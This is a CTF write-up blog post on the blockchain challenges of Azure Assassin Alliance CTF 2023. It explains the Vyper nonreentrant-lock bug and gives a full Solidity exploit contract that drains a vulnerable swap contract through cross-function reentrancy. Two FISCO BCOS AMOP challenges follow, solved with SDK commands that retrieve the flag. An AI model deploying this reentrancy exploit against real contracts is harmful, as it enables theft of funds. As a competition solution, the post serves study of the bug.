---
title: "Azure Assassin Alliance CTF 2023 Blockchain"
date: 2023-11-01T00:00:00+08:00
---

This time my teammates from 0RAYS and I participated in Azure Assassin Alliance CTF 2023 and got third place🥉

I participated in solving some web and misc challenges. The web challenges is not very difficult and not very interesting, but the blockchain challenge really appeals to me. So I feel the necessity to write it down.

## Viper

```yaml
Description
When you encounter a viper, you need to be more careful to prevent injury

Service
Geth: http://120.46.58.72:8545
Faucet: http://120.46.58.72:8080
Playground: nc 120.46.58.72 20000
```

source code:

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "@openzeppelin/contracts@4.0.0/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts@4.0.0/access/Ownable.sol";

contract VETH is ERC20, Ownable {
    constructor() ERC20("VETH", "vETH") Ownable() {}

    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }
}
```

```python
# @version ^0.2.16

from vyper.interfaces import ERC20

event Deposit:
    user: indexed(address)
    token: indexed(address)
    amount: uint256

event Withdraw:
    user: indexed(address)
    token: indexed(address)
    amount: uint256

event Swap:
    user: indexed(address)
    tokenIn: indexed(address)
    tokenOut: indexed(address)
    amount: uint256


ETH: constant(address) = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE
NCOINS: constant(int128) = 2
BONUS: constant(uint256) = 4276545

owner: public(address)
initialized: public(bool)
coins: public(address[NCOINS])
ratio: public(uint256)
balances: public(HashMap[int128, HashMap[address, uint256]])


@payable
@external
def __init__():
    self.owner = msg.sender
    self.initialized = False


@external
def initialize(underlying: address):
    assert msg.sender == self.owner
    assert not self.initialized, "has been initialized"
    self.coins[0] = ETH
    self.coins[1] = underlying
    self.ratio = 2
    self.initialized = True


@payable
@external
@nonreentrant('lock')
def deposit(index: int128, amount: uint256):
    assert self.initialized, "not available yet"
    assert index >= 0 and index < NCOINS
    token: address = self.coins[index]

    if token == ETH:
        assert msg.value >= amount
        if msg.value - amount > 0:
            raw_call(msg.sender, b"", value=msg.value - amount)
    else:
        ERC20(token).transferFrom(msg.sender, self, amount)
    self.balances[index][msg.sender] += amount
    
    log Deposit(msg.sender, token, amount)


@external
@nonreentrant('lock')
def withdraw(index: int128, amount: uint256):
    assert self.initialized, "not available yet"
    assert index >= 0 and index < NCOINS
    token: address = self.coins[index]
    assert self.balances[index][msg.sender] >= amount

    if token == ETH:
        raw_call(msg.sender, b"", value=amount)
    else:
        ERC20(token).transfer(msg.sender, amount)
    self.balances[index][msg.sender] -= amount
    
    log Withdraw(msg.sender, token, amount)


@payable
@external
@nonreentrant('lock')
def swap(in_index: int128, out_index: int128, amount: uint256):
    assert self.initialized, "not available yet"
    assert in_index >= 0 and in_index < NCOINS
    assert out_index >= 0 and out_index < NCOINS
    assert in_index != out_index
    
    if in_index == 0:
        if msg.value - amount > 0:
            raw_call(msg.sender, b"", value=msg.value - amount)
        increase: uint256 = amount * self.ratio
        self.balances[out_index][msg.sender] += increase + BONUS
    else:
        _before: uint256 = ERC20(self.coins[in_index]).balanceOf(self)
        if msg.value > 0:
            raw_call(msg.sender, b"", value=msg.value)
        ERC20(self.coins[in_index]).transferFrom(msg.sender, self, amount)
        _after: uint256 = ERC20(self.coins[in_index]).balanceOf(self)
        increase: uint256 = (_after - _before) / self.ratio
        self.balances[out_index][msg.sender] += increase
    
    log Swap(msg.sender, self.coins[in_index], self.coins[out_index], amount)


@external
@view
def isSolved() -> bool:
    return self.balance == 0
```

In the initial state, the balance of VETH is 0 while the Viper has `3 eth`

Referrence to [Vyper Nonreentrancy Lock Vulnerability Technical Post-Mortem Report - HackMD](https://hackmd.io/@vyperlang/HJUgNMhs2#Vulnerability-Introduced-Malfunctioning-Re-Entrancy-Locks-in-v0215)，the vulnerability arises from how the `storage_slot` offsets of re-entrancy keys were ignoring the actual `<key>` of the `@nonreentrant(<key>)` decorator and were simply reserving a new slot for each seen `@nonreentrant` decorator regardless of what “key” was utilized, leading to `cross-function reentrance` 。

Then dive into the code:

- VETH.sol implement a simple token contract by importing `ERC20`

- the address of deployed VETH contract would be passed to `initialize` function of Viper, as a token conversion target

- Viper contract has following callable function:

  - **deposit** | index 0 for deposit ETH, index 1 for deposit VETH token

  - **withdraw** | index 0 for withdraw ETH, index 1 for deposit VETH token
  - **swap** | index 0,1 for converse ETH to VETH token, index 1,0 for converse VETH token to ETH

Simply noted that the implement of these function are not based on `Checks, Effects, and Interactions`, which means its exploitable.

Taking advantage of the reentrancy vulnerability, during the process of exchanging VETH token for ETH, VETH token is stored in the Viper contract. While increasing Viper's VETH balance, it also increases the VETH and ETH balances of one's own account in viper.

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Viper {
    function deposit(int128, uint256) external payable ;
    function withdraw(int128, uint256) external ;
    function swap(int128, int128, uint256) external payable ;
    function isSolved() view external returns (bool);
}

interface VETH {
    function approve(address, uint256) external payable ;
}
contract exp {

    Viper public viper = Viper(0x6A933E75E415e0E56455f44dD0e486B3258F89a0);
    VETH public veth = VETH(0x692ab1BA329Dd0CAdDffF1c23FfCC3614375aE69);
    uint256 public count;

    constructor() payable {
        // 4 ether
    }

    function go() public {
        veth.approve(address(viper), type(uint256).max);
        viper.swap{value: 3 ether}(0, 1, 3 ether);
        viper.withdraw(1, 6 ether);
        viper.swap{value: 1 wei}(1, 0, 0);
        viper.withdraw(1, 6 ether);
        viper.swap(1, 0, 6 ether);
        viper.withdraw(0, 6 ether);
    }

    receive() external payable {
        if (count==0) {
            count++;
            viper.deposit(1, 6 ether);
        }
    }
}
```

```Solidity
ACTF{8EW@rE_0F_vEnom0us_sNaK3_81T3$_as_1t_HA$_nO_cOnSc1ENCe}
```

## AMOP 1

```yaml
Description:
FISCO BCOS is a blockchain that allows you to pass messages.

Service:
Access 120.46.58.72:30201 for the channel endpoint.
```

The official document of `FISCO BCOS` was written badly while using abbreviation and full name represent two different versions with incomplete description. Fortunately the `usage` of [SDK](https://github.com/FISCO-BCOS/java-sdk-demo) is enough to solve this challenge.

```Shell
root@Aliyun-ubuntu2004:~/fisco/java-sdk-demo/dist# java -cp "apps/*:lib/*:conf/" org.fisco.bcos.sdk.demo.amop.tool.AmopSubscriber flag1
SLF4J: Class path contains multiple SLF4J bindings.
SLF4J: Found binding in [jar:file:/root/fisco/java-sdk-demo/dist/lib/log4j-slf4j-impl-2.19.0.jar!/org/slf4j/impl/StaticLoggerBinder.class]
SLF4J: Found binding in [jar:file:/root/fisco/java-sdk-demo/dist/lib/log4j-slf4j-impl-2.17.1.jar!/org/slf4j/impl/StaticLoggerBinder.class]
SLF4J: See http://www.slf4j.org/codes.html#multiple_bindings for an explanation.
SLF4J: Actual binding is of type [org.apache.logging.slf4j.Log4jLoggerFactory]
Start test
Step 2:Receive msg, time: 2023-10-28 14:48:23topic:flag1 content:ACTF{Con5oR7ium_B1ock_
```

```Shell
root@Aliyun-ubuntu2004:~/fisco/java-sdk-demo/dist# java -cp 'conf/:lib/*:apps/*' org.fisco.bcos.sdk.demo.amop.tool.AmopSubscriberPrivateByKey subscribe flag2 conf/privkey
SLF4J: Class path contains multiple SLF4J bindings.
SLF4J: Found binding in [jar:file:/root/fisco/java-sdk-demo/dist/lib/log4j-slf4j-impl-2.19.0.jar!/org/slf4j/impl/StaticLoggerBinder.class]
SLF4J: Found binding in [jar:file:/root/fisco/java-sdk-demo/dist/lib/log4j-slf4j-impl-2.17.1.jar!/org/slf4j/impl/StaticLoggerBinder.class]
SLF4J: See http://www.slf4j.org/codes.html#multiple_bindings for an explanation.
SLF4J: Actual binding is of type [org.apache.logging.slf4j.Log4jLoggerFactory]
Start test
Step 2:Receive msg, time: 2023-10-28 14:55:18topic:flag2 content:cHAiN_sO_INterESt1NG}
```

```
ACTF{Con5oR7ium_B1ock_cHAiN_sO_INterESt1NG}
```

## AMOP 2

```yaml
Description:
FISCO BCOS is a blockchain that allow you to pass message.

Service:
Access 120.46.58.72:48547 for RPC
Access 120.46.58.72:41202 for channel endpoint
```

(I'll make it up soon)
